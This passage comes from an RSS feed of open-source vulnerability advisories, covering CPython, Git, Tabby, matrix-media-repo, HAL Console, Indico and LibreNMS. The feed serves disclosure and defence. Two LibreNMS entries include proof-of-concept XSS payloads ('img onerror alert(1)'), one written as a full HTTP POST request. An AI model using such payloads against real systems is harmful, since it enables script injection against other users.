href='https://mail.python.org/archives/list/security-announce@python.org/thread/GNFCKVI4TCATKQLALJ5SN4L4CSPSMILU/'>https://mail.python.org/archives/list/security-announce@python.org/thread/GNFCKVI4TCATKQLALJ5SN4L4CSPSMILU/</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/08/22/1'>http://www.openwall.com/lists/oss-security/2024/08/22/1</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/08/22/4'>http://www.openwall.com/lists/oss-security/2024/08/22/4</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/08/23/1'>http://www.openwall.com/lists/oss-security/2024/08/23/1</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/08/23/2'>http://www.openwall.com/lists/oss-security/2024/08/23/2</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20241011-0010/'>https://security.netapp.com/advisory/ntap-20241011-0010/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>There is a HIGH severity vulnerability affecting the CPython &quot;zipfile&quot;module affecting &quot;zipfile.Path&quot;. Note that the more common API &quot;zipfile.ZipFile&quot; class is unaffected.When iterating over names of entries in a zip archive (for example, methodsof &quot;zipfile.Path&quot; like &quot;namelist()&quot;, &quot;iterdir()&quot;, etc)the process can be put into an infinite loop with a maliciously craftedzip archive. This defect applies when reading only metadata or extractingthe contents of the zip archive. Programs that are not handlinguser-controlled zip archives are not affected.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-9287: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-9287</link>
                    <pubDate>2025-01-17T15:05:06.007Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-9287'>https://osv.dev/vulnerability/BIT-python-min-2024-9287</a><br>
                            <b>Published:</b> 2025-01-17T15:05:06.007Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/633555735a023d3e4d92ba31da35b1205f9ecbd7'>https://github.com/python/cpython/commit/633555735a023d3e4d92ba31da35b1205f9ecbd7</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/8450b2482586857d689b6658f08de9c8179af7db'>https://github.com/python/cpython/commit/8450b2482586857d689b6658f08de9c8179af7db</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/9286ab3a107ea41bd3f3c3682ce2512692bdded8'>https://github.com/python/cpython/commit/9286ab3a107ea41bd3f3c3682ce2512692bdded8</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/ae961ae94bf19c8f8c7fbea3d1c25cc55ce8ae97'>https://github.com/python/cpython/commit/ae961ae94bf19c8f8c7fbea3d1c25cc55ce8ae97</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/e52095a0c1005a87eed2276af7a1f2f66e2b6483'>https://github.com/python/cpython/commit/e52095a0c1005a87eed2276af7a1f2f66e2b6483</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/124651'>https://github.com/python/cpython/issues/124651</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/124712'>https://github.com/python/cpython/pull/124712</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/RSPJ2B5JL22FG3TKUJ7D7DQ4N5JRRBZL/'>https://mail.python.org/archives/list/security-announce@python.org/thread/RSPJ2B5JL22FG3TKUJ7D7DQ4N5JRRBZL/</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/d48cc82ed25e26b02eb97c6263d95dcaa1e9111b'>https://github.com/python/cpython/commit/d48cc82ed25e26b02eb97c6263d95dcaa1e9111b</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability has been found in the CPython `venv` module and CLI where path names provided when creating a virtual environment were not quoted properly, allowing the creator to inject commands into virtual environment &quot;activation&quot; scripts (ie &quot;source venv&#x2F;bin&#x2F;activate&quot;). This means that attacker-controlled virtual environments are able to run commands when the virtual environment is activated. Virtual environments which are not created by an attacker or which aren&#x27;t activated before being used (ie &quot;.&#x2F;venv&#x2F;bin&#x2F;python&quot;) are not affected.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-git-2024-52005: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-git-2024-52005</link>
                    <pubDate>2025-01-17T14:56:11.515Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-git-2024-52005'>https://osv.dev/vulnerability/BIT-git-2024-52005</a><br>
                            <b>Published:</b> 2025-01-17T14:56:11.515Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/git/git/security/advisories/GHSA-7jjc-gg6m-3329'>https://github.com/git/git/security/advisories/GHSA-7jjc-gg6m-3329</a></li><li>- <a target='_blank' href='https://lore.kernel.org/git/1M9FnZ-1taoNo1wwh-00ESSd@mail.gmx.net'>https://lore.kernel.org/git/1M9FnZ-1taoNo1wwh-00ESSd@mail.gmx.net</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Git is a source code management tool. When cloning from a server (or fetching, or pushing), informational or error messages are transported from the remote Git process to the client via the so-called &quot;sideband channel&quot;. These messages will be prefixed with &quot;remote:&quot; and printed directly to the standard error output. Typically, this standard error output is connected to a terminal that understands ANSI escape sequences, which Git did not protect against. Most modern terminals support control sequences that can be used by a malicious actor to hide and misrepresent information, or to mislead the user into executing untrusted scripts. As requested on the git-security mailing list, the patches are under discussion on the public mailing list. Users are advised to update as soon as possible. Users unable to upgrade should avoid recursive clones unless they are from trusted sources.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8vq4-8hfp-29xh: 7.7 | <b>Eugeny Tabby Sends Password Despite Host Key Verification Failure</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8vq4-8hfp-29xh</link>
                    <pubDate>2025-01-17T00:30:48Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8vq4-8hfp-29xh'>https://osv.dev/vulnerability/GHSA-8vq4-8hfp-29xh</a><br>
                            <b>Published:</b> 2025-01-17T00:30:48Z<br>
                            <b>Severity:</b> 7.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Eugeny/tabby/issues/9955'>https://github.com/Eugeny/tabby/issues/9955</a></li><li>- <a target='_blank' href='https://github.com/Eugeny/tabby/commit/1c077147acd0a6ec9f8ee80d83a3e9688fbb9444'>https://github.com/Eugeny/tabby/commit/1c077147acd0a6ec9f8ee80d83a3e9688fbb9444</a></li><li>- <a target='_blank' href='https://github.com/Eugeny/tabby'>https://github.com/Eugeny/tabby</a></li></ul><br>
                            <b>Details:</b> <b>Eugeny Tabby Sends Password Despite Host Key Verification Failure</b><br>An issue in Eugeny Tabby 1.0.213 allows a remote attacker to obtain sensitive information via the server and sends the SSH username and password even when the host key verification fails.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-4ff6-858j-r822: 4.3 | <b>Gomatrixserverlib Server-Side Request Forgery (SSRF) on redirects and federation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-4ff6-858j-r822</link>
                    <pubDate>2025-01-16T23:08:32Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-4ff6-858j-r822'>https://osv.dev/vulnerability/GHSA-4ff6-858j-r822</a><br>
                            <b>Published:</b> 2025-01-16T23:08:32Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/matrix-org/gomatrixserverlib/security/advisories/GHSA-4ff6-858j-r822'>https://github.com/matrix-org/gomatrixserverlib/security/advisories/GHSA-4ff6-858j-r822</a></li><li>- <a target='_blank' href='https://github.com/matrix-org/gomatrixserverlib/commit/c4f1e01eab0dd435709ad15463ed38a079ad6128'>https://github.com/matrix-org/gomatrixserverlib/commit/c4f1e01eab0dd435709ad15463ed38a079ad6128</a></li><li>- <a target='_blank' href='https://github.com/matrix-org/gomatrixserverlib'>https://github.com/matrix-org/gomatrixserverlib</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3396'>https://pkg.go.dev/vuln/GO-2025-3396</a></li></ul><br>
                            <b>Details:</b> <b>Gomatrixserverlib Server-Side Request Forgery (SSRF) on redirects and federation</b><br>### Impact
Gomatrixserverlib is vulnerable to server-side request forgery, serving content from a private network it can access, under certain conditions.

### Patches

c4f1e01eab0dd435709ad15463ed38a079ad6128 fixes this issue.


### Workarounds
Use a local firewall to limit the network segments and hosts the service using gomatrixserverlib can access.

### References
N&#x2F;A

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3396: 0 | Server-Side Request Forgery (SSRF) on redirects and federation in github.com&#x2F;matrix-org&#x2F;gomatrixserverlib</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3396</link>
                    <pubDate>2025-01-16T22:53:23Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3396'>https://osv.dev/vulnerability/GO-2025-3396</a><br>
                            <b>Published:</b> 2025-01-16T22:53:23Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/matrix-org/gomatrixserverlib/security/advisories/GHSA-4ff6-858j-r822'>https://github.com/matrix-org/gomatrixserverlib/security/advisories/GHSA-4ff6-858j-r822</a></li></ul><br>
                            <b>Details:</b> Server-Side Request Forgery (SSRF) on redirects and federation in github.com&#x2F;matrix-org&#x2F;gomatrixserverlib
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-rcxc-wjgw-579r: 6.8 | <b>Matrix Media Repo (MMR) allows untrusted file formats can be thumbnailed, invoking potentially further untrusted decoders</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-rcxc-wjgw-579r</link>
                    <pubDate>2025-01-16T19:35:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-rcxc-wjgw-579r'>https://osv.dev/vulnerability/GHSA-rcxc-wjgw-579r</a><br>
                            <b>Published:</b> 2025-01-16T19:35:09Z<br>
                            <b>Severity:</b> 6.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-rcxc-wjgw-579r'>https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-rcxc-wjgw-579r</a></li><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo'>https://github.com/t2bot/matrix-media-repo</a></li><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo/releases/tag/v1.3.8'>https://github.com/t2bot/matrix-media-repo/releases/tag/v1.3.8</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3400'>https://pkg.go.dev/vuln/GO-2025-3400</a></li></ul><br>
                            <b>Details:</b> <b>Matrix Media Repo (MMR) allows untrusted file formats can be thumbnailed, invoking potentially further untrusted decoders</b><br>### Impact

If SVG or JPEGXL thumbnailers are enabled (they are disabled by default), a user may upload a file which claims to be either of these types and request a thumbnail to invoke a different decoder in ImageMagick. In some ImageMagick installations, this includes the capability to run Ghostscript to decode the image&#x2F;file.

If MP4 thumbnailers are enabled (also disabled by default), the same issue as above may occur with the ffmpeg installation instead.

MMR uses a number of other decoders for all other file types when preparing thumbnails. Theoretical issues are possible with these decoders, however in testing they were not possible to exploit.

### Patches

This is fixed in [MMR v1.3.8](https:&#x2F;&#x2F;github.com&#x2F;t2bot&#x2F;matrix-media-repo&#x2F;releases&#x2F;tag&#x2F;v1.3.8). MMR now inspects the mimetype of media prior to thumbnailing, and picks a thumbnailer based on those results instead of relying on user-supplied values. This may lead to fewer thumbnails when obscure file shapes are used. This also helps narrow scope of theoretical issues with all decoders MMR uses for thumbnails.

### Workarounds

Disabling the SVG, JPEGXL, and MP4 thumbnail types in the MMR config prevents the decoders from being invoked. Further disabling uncommon file types on the server is recommended to limit risk surface. 

Containers and other similar technologies may also be used to limit the impact of vulnerabilities in external decoders, like ImageMagick and ffmpeg. 

Some installations of ImageMagick may disable &quot;unsafe&quot; file types, like PDFs, already. This option can be replicated to other environments as needed. ffmpeg may be compiled with limited decoders&#x2F;codecs. The Docker image for MMR disables PDFs and similar formats by default.

### References

A similar issue was discovered in Synapse: https:&#x2F;&#x2F;github.com&#x2F;element-hq&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-vp6v-whfm-rv3g

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-r6jg-jfv6-2fjv: 5.0 | <b>Matrix Media Repo (MMR) allows Server-Side Request Forgery (SSRF) on redirects and federation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-r6jg-jfv6-2fjv</link>
                    <pubDate>2025-01-16T19:35:02Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-r6jg-jfv6-2fjv'>https://osv.dev/vulnerability/GHSA-r6jg-jfv6-2fjv</a><br>
                            <b>Published:</b> 2025-01-16T19:35:02Z<br>
                            <b>Severity:</b> 5.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-r6jg-jfv6-2fjv'>https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-r6jg-jfv6-2fjv</a></li><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo'>https://github.com/t2bot/matrix-media-repo</a></li><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo/releases/tag/v1.3.8'>https://github.com/t2bot/matrix-media-repo/releases/tag/v1.3.8</a></li><li>- <a target='_blank' href='https://learn.snyk.io/lesson/ssrf-server-side-request-forgery'>https://learn.snyk.io/lesson/ssrf-server-side-request-forgery</a></li><li>- <a target='_blank' href='https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'>https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3399'>https://pkg.go.dev/vuln/GO-2025-3399</a></li><li>- <a target='_blank' href='https://www.agwa.name/blog/post/preventing_server_side_request_forgery_in_golang'>https://www.agwa.name/blog/post/preventing_server_side_request_forgery_in_golang</a></li></ul><br>
                            <b>Details:</b> <b>Matrix Media Repo (MMR) allows Server-Side Request Forgery (SSRF) on redirects and federation</b><br>### Impact
Matrix Media Repo (MMR) is vulnerable to server-side request forgery, serving content from a private network it can access, under certain conditions.

### Patches
This is fixed in [MMR v1.3.8](https:&#x2F;&#x2F;github.com&#x2F;t2bot&#x2F;matrix-media-repo&#x2F;releases&#x2F;tag&#x2F;v1.3.8).

### Workarounds
Restricting which hosts MMR is allowed to contact via (local) firewall rules or a transparent proxy.

### References
https:&#x2F;&#x2F;owasp.org&#x2F;www-community&#x2F;attacks&#x2F;Server_Side_Request_Forgery
https:&#x2F;&#x2F;learn.snyk.io&#x2F;lesson&#x2F;ssrf-server-side-request-forgery&#x2F;
https:&#x2F;&#x2F;www.agwa.name&#x2F;blog&#x2F;post&#x2F;preventing_server_side_request_forgery_in_golang



                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-gp86-q8hg-fpxj: 5.3 | <b>matrix-media-repo (MMR) allows a denial of service through memory exhaustion</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-gp86-q8hg-fpxj</link>
                    <pubDate>2025-01-16T19:07:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-gp86-q8hg-fpxj'>https://osv.dev/vulnerability/GHSA-gp86-q8hg-fpxj</a><br>
                            <b>Published:</b> 2025-01-16T19:07:43Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-gp86-q8hg-fpxj'>https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-gp86-q8hg-fpxj</a></li><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo'>https://github.com/t2bot/matrix-media-repo</a></li><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo/releases/tag/v1.3.8'>https://github.com/t2bot/matrix-media-repo/releases/tag/v1.3.8</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3398'>https://pkg.go.dev/vuln/GO-2025-3398</a></li></ul><br>
                            <b>Details:</b> <b>matrix-media-repo (MMR) allows a denial of service through memory exhaustion</b><br>### Impact
MMR makes requests to other servers as part of normal operation, and these resource owners can return large amounts of JSON back to MMR for parsing. In parsing, MMR can consume large amounts of memory and exhaust available memory.

### Patches
This is fixed in [MMR v1.3.8](https:&#x2F;&#x2F;github.com&#x2F;t2bot&#x2F;matrix-media-repo&#x2F;releases&#x2F;tag&#x2F;v1.3.8).

### Workarounds
Forward proxies can be configured to block requests to unsafe hosts. Alternatively, MMR processes can be configured with memory limits and auto-restart. Running multiple MMR processes concurrently can help ensure a restart does not overly impact users.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-jhvj-f397-8w6q: 6.5 | <b>HAL Console has a Cross Site Scripting (XSS) vulnerability of user input</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-jhvj-f397-8w6q</link>
                    <pubDate>2025-01-16T19:05:39Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-jhvj-f397-8w6q'>https://osv.dev/vulnerability/GHSA-jhvj-f397-8w6q</a><br>
                            <b>Published:</b> 2025-01-16T19:05:39Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/hal/console/security/advisories/GHSA-jhvj-f397-8w6q'>https://github.com/hal/console/security/advisories/GHSA-jhvj-f397-8w6q</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2025-23366'>https://access.redhat.com/security/cve/CVE-2025-23366</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2337619'>https://bugzilla.redhat.com/show_bug.cgi?id=2337619</a></li><li>- <a target='_blank' href='https://github.com/hal/console'>https://github.com/hal/console</a></li><li>- <a target='_blank' href='https://github.com/hal/console/releases/tag/v3.7.7'>https://github.com/hal/console/releases/tag/v3.7.7</a></li></ul><br>
                            <b>Details:</b> <b>HAL Console has a Cross Site Scripting (XSS) vulnerability of user input</b><br>A flaw was found in the HAL Console in the Wildfly component, which does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output used as a web page that is served to other users. The attacker must be authenticated as a user that belongs to management groups “SuperUser”, “Admin”, or “Maintainer”.

### Impact
Cross-site scripting (XSS) vulnerability in the management console.

### Patches
Fixed in [HAL 3.7.7.Final](https:&#x2F;&#x2F;github.com&#x2F;hal&#x2F;console&#x2F;releases&#x2F;tag&#x2F;v3.7.7) 

### Workarounds
No workaround available

### References
- https:&#x2F;&#x2F;access.redhat.com&#x2F;security&#x2F;cve&#x2F;CVE-2025-23366
- https:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;show_bug.cgi?id=2337619

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vc2m-hw89-qjxf: 5.3 | <b>matrix-media-repo (MMR) allows denial of service&#x2F;high operating costs through unauthenticated downloads</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vc2m-hw89-qjxf</link>
                    <pubDate>2025-01-16T19:05:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vc2m-hw89-qjxf'>https://osv.dev/vulnerability/GHSA-vc2m-hw89-qjxf</a><br>
                            <b>Published:</b> 2025-01-16T19:05:12Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-vc2m-hw89-qjxf'>https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-vc2m-hw89-qjxf</a></li><li>- <a target='_blank' href='https://en.wikipedia.org/wiki/Leaky_bucket#As_a_meter'>https://en.wikipedia.org/wiki/Leaky_bucket#As_a_meter</a></li><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo'>https://github.com/t2bot/matrix-media-repo</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3401'>https://pkg.go.dev/vuln/GO-2025-3401</a></li></ul><br>
                            <b>Details:</b> <b>matrix-media-repo (MMR) allows denial of service&#x2F;high operating costs through unauthenticated downloads</b><br>### Impact

MMR before version 1.3.5 is vulnerable to unbounded disk consumption, where an unauthenticated adversary can induce it to download and cache large amounts of remote media files.

MMR&#x27;s typical operating environment uses S3-like storage as a backend, with file-backed store as an alternative option. Instances using a file-backed store or those which self-host an S3 storage system are therefore vulnerable to a disk fill attack. Once the disk is full, authenticated users will be unable to upload new media, resulting in denial of service.

For instances configured to use a cloud-based S3 storage option, this could result in high service fees instead of a denial of service.

### Patches

MMR 1.3.5 introduces a new default-on &quot;leaky bucket&quot; rate limit to reduce the amount of data a user can request at a time. This does not fully address the issue, but does limit an unauthenticated user&#x27;s ability to request large amounts of data.

Operators should note that the leaky bucket implementation introduced in MMR 1.3.5 requires the IP address associated with the request to be forwarded, to avoid mistakenly applying the rate limit to the reverse proxy instead. To avoid this issue, the reverse proxy should populate the `X-Forwarded-For` header when sending the request to MMR.

### Workarounds

Operators may wish to lower the maximum file size they allow and implement harsh rate limits, though this can still lead to a large amount of data to be downloaded. 

### References

https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Leaky_bucket#As_a_meter
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8vmr-h7h5-cqhg: 5.3 | <b>matrix-media-repo (MMR) allows unauthenticated writes to the media repository, which may allow planting of problematic content</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8vmr-h7h5-cqhg</link>
                    <pubDate>2025-01-16T19:05:01Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8vmr-h7h5-cqhg'>https://osv.dev/vulnerability/GHSA-8vmr-h7h5-cqhg</a><br>
                            <b>Published:</b> 2025-01-16T19:05:01Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-8vmr-h7h5-cqhg'>https://github.com/t2bot/matrix-media-repo/security/advisories/GHSA-8vmr-h7h5-cqhg</a></li><li>- <a target='_blank' href='https://github.com/matrix-org/matrix-spec-proposals/pull/3916'>https://github.com/matrix-org/matrix-spec-proposals/pull/3916</a></li><li>- <a target='_blank' href='https://github.com/t2bot/matrix-media-repo'>https://github.com/t2bot/matrix-media-repo</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3397'>https://pkg.go.dev/vuln/GO-2025-3397</a></li></ul><br>
                            <b>Details:</b> <b>matrix-media-repo (MMR) allows unauthenticated writes to the media repository, which may allow planting of problematic content</b><br>### Impact

MMR before version 1.3.5 allows, by design, unauthenticated remote participants to trigger a download and caching of remote media from a remote homeserver to the local media repository. Such content then also becomes available for download from the local homeserver in an unauthenticated way. The implication is that unauthenticated remote adversaries can use this functionality to plant problematic content into the media repository.

### Patches

MMR 1.3.5 introduces a partial mitigation in the form of new endpoints which require authentication for media downloads. The unauthenticated endpoints will be frozen in a future release, closing the attack vector.

### Workarounds

Though extremely limited, server operators can use more strict rate limits based on IP address.

### References

https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3916

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-3wg7-r7q5-r2jf: 0.0 | <b>Indico Insecure Access</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-3wg7-r7q5-r2jf</link>
                    <pubDate>2025-01-16T18:31:00Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-3wg7-r7q5-r2jf'>https://osv.dev/vulnerability/GHSA-3wg7-r7q5-r2jf</a><br>
                            <b>Published:</b> 2025-01-16T18:31:00Z<br>
                            <b>Severity:</b> 0.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cetinpy/CVE-2024-50633/issues/1'>https://github.com/cetinpy/CVE-2024-50633/issues/1</a></li><li>- <a target='_blank' href='https://github.com/cetinpy/CVE-2024-50633'>https://github.com/cetinpy/CVE-2024-50633</a></li><li>- <a target='_blank' href='https://github.com/indico/indico'>https://github.com/indico/indico</a></li></ul><br>
                            <b>Details:</b> <b>Indico Insecure Access</b><br>A Broken Object Level Authorization (BOLA) vulnerability in Indico v3.2.9 allows attackers to access sensitive information via sending a crafted POST request to the component &#x2F;api&#x2F;principals.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-g84x-g96g-rcjc: 5.4 | <b>Librenms has a reflected XSS on error alert</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-g84x-g96g-rcjc</link>
                    <pubDate>2025-01-16T17:33:10Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-g84x-g96g-rcjc'>https://osv.dev/vulnerability/GHSA-g84x-g96g-rcjc</a><br>
                            <b>Published:</b> 2025-01-16T17:33:10Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/librenms/librenms/security/advisories/GHSA-g84x-g96g-rcjc'>https://github.com/librenms/librenms/security/advisories/GHSA-g84x-g96g-rcjc</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms'>https://github.com/librenms/librenms</a></li></ul><br>
                            <b>Details:</b> <b>Librenms has a reflected XSS on error alert</b><br>XSS on the parameters:`&#x2F;addhost` -&amp;gt; param: community


of Librenms versions 24.10.1 ([https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms](https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms)) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.


**Proof of Concept:**
1. Navigate to the &#x2F;addhost path.
2. Fill in all required fields.
3. In the Community field, enter the following payload: `&quot;&amp;gt;&amp;lt;img src=a onerror=&quot;alert(1)&quot;&amp;gt;`.
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;025a7692-e730-4e3b-bca7-761ed2a60cf7)

4. Submit the form to save changes.
5 The script will execute when the error alert &quot;No reply with community + payload&quot; appears.
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;4663e24a-4ff7-42f4-9c3d-3c5b5bf34017)



**Impact:**

Execution of Malicious Code


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-c66p-64fj-jmc2: 4.6 | <b>LibreNMS Misc Section Stored Cross-site Scripting vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-c66p-64fj-jmc2</link>
                    <pubDate>2025-01-16T17:32:55Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-c66p-64fj-jmc2'>https://osv.dev/vulnerability/GHSA-c66p-64fj-jmc2</a><br>
                            <b>Published:</b> 2025-01-16T17:32:55Z<br>
                            <b>Severity:</b> 4.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/librenms/librenms/security/advisories/GHSA-c66p-64fj-jmc2'>https://github.com/librenms/librenms/security/advisories/GHSA-c66p-64fj-jmc2</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms/pull/16722'>https://github.com/librenms/librenms/pull/16722</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms/commit/26258a2518dbfa55b213ec4b90ec16ed97efb597'>https://github.com/librenms/librenms/commit/26258a2518dbfa55b213ec4b90ec16ed97efb597</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms'>https://github.com/librenms/librenms</a></li></ul><br>
                            <b>Details:</b> <b>LibreNMS Misc Section Stored Cross-site Scripting vulnerability</b><br># StoredXSS-LibreNMS-MiscSection


**Description:**


Stored XSS on the parameter: `ajax_form.php` -&amp;gt; param: state

Request:
```http
POST &#x2F;ajax_form.php HTTP&#x2F;1.1
Host: &amp;lt;your_host&amp;gt;
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: &amp;lt;your_XSRF_token&amp;gt;
Content-Type: application&#x2F;x-www-form-urlencoded; charset=UTF-8
Cookie: &amp;lt;your_cookie&amp;gt;

type=override-config&amp;device_id=1&amp;attrib=override_icmp_disable&amp;state=&quot;&amp;gt;&amp;lt;img%20src%20onerror=&quot;alert(1)&quot;&amp;gt; 
```


